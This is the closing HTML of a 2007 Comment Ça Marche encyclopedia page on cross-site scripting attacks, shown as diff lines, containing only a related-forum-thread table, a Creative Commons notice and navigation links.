+<td><span class="Date">09/07&nbsp;15h12</span><span class="Date">-&gt;</span><a class="Date" href="http://www.commentcamarche.net/forum/affich-118962-server-createobject-scripting-filesystemobje#2002-07-09%2015%3A12%3A06">chaf</a></td><td style="text-align:center"><span class="Texte">1</span></td>
+</tr>
+<tr class="sb">
+<td><span class="Dategris">26/07&nbsp;11h36</span></td>
+<td style="vertical-align:middle"><a href="http://www.commentcamarche.net/forum/affich-126237-scripting#2002-07-26%2017%3A16%3A58"><img src="../images/carre.gif" border="0" alt="scripting"></a><a href="http://www.commentcamarche.net/forum/affich-126237-scripting">&nbsp;Scripting ?</a></td>
+<td><a href="http://www.commentcamarche.net/forum/forum-3-developpement">D&eacute;veloppement</a></td>
+<td><span class="Date">26/07&nbsp;17h16</span><span class="Date">-&gt;</span><a class="Date" href="http://www.commentcamarche.net/forum/affich-126237-scripting#2002-07-26%2017%3A16%3A58">sebsauvage</a></td><td style="text-align:center"><span class="Texte">1</span></td>
+</tr>
+<tr class="sa">
+<td><span class="Dategris">20/10&nbsp;20h08</span></td>
+<td style="vertical-align:middle"><a href="http://www.commentcamarche.net/forum/affich-2431957-erreur-1607-install-shield-scripting-runtime#2006-10-21%2014%3A22%3A27"><img src="../images/carre.gif" border="0" alt="1607 install shield scripting runtime"></a><a href="http://www.commentcamarche.net/forum/affich-2431957-erreur-1607-install-shield-scripting-runtime">&nbsp;erreur 1607 Install shield Scripting Runtime</a></td>
+<td><a href="http://www.commentcamarche.net/forum/forum-19-jeux-videos">Jeux vid&eacute;os</a></td>
+<td><span class="Date">21/10&nbsp;14h22</span><span class="Date">-&gt;</span><a class="mlink2" href="http://www.commentcamarche.net/forum/affich-2431957-erreur-1607-install-shield-scripting-runtime#2006-10-21%2014%3A22%3A27">johann-ordi</a></td><td style="text-align:center"><span class="Texte">1</span></td>
+</tr>
+	<tr class="sa">
+	<td colspan="2"><span class="Texte"><img src="../images/carreblock.gif" width="12" alt="" title="Discussion ferm&eacute;e">Discussion ferm&eacute;e
+    <img src="../images/carrevalid.png" width="12" alt="" title="Probl&egrave;me r&eacute;solu">Probl&egrave;me r&eacute;solu</span></td>
+	<td style="vertical-align:top;text-align:right;" colspan="3"><img src="../images/plus.png" alt="Cross site scripting" border="0"> Plus de discussions sur &laquo;&nbsp;<a href="http://www.commentcamarche.net/f/cross-site-scripting"><b>Cross site scripting</b></a>&nbsp;&raquo;</td></tr></table>
+<br><span class="Footer">Ce document intitul&eacute; &laquo;&nbsp;<a href="http://www.commentcamarche.net/attaques/cross-site-scripting.php3">Attaques - Cross-Site Scripting</a>&nbsp;&raquo; issu de l'<a href="http://www.commentcamarche.net/encyclopedie/">encyclop&eacute;die</a> <a href="http://www.commentcamarche.net/informatique/informatique.php3">informatique</a> <a href="http://www.commentcamarche.net">Comment &Ccedil;a Marche</a> (<a href="http://www.commentcamarche.net/">www.commentcamarche.net</a>) est mis &agrave; disposition sous les termes de la licence <a href="../ccmguide/ccmlicence.htm">Creative Commons</a>.
+Vous pouvez copier, modifier des copies de cette page, dans les conditions fix&eacute;es par la licence, tant que cette note appara&icirc;t clairement.</span>
+<br>&nbsp;
+<center><a href="manipulation-url.htm"><img src="../images/bckward.gif" border="0" width="38" height="63" alt=""></a>
+<a href="injection-commandes-sql.htm"><img src="../images/forward.gif" border="0" width="38" height="63" alt=""></a></center>
+</div>
+
+</td>
+</tr>
+
+<tr><th colspan="4" style="background-color:#CED7F6">&nbsp;</th></tr>
+</table>
+<div id="footer"><br><a href="../ccmguide/ccmintro.htm"><b>A propos</b></a> | <a href="../ccmguide/cgu-conditions-generales.htm"><b>Conditions g&eacute;n&eacute;rales</b></a>  | &copy; Tous droits r&eacute;serv&eacute;s 2007 <a href="http://www.commentcamarche.net">Quid�a</a>
+</div>
+</body>
+</html>
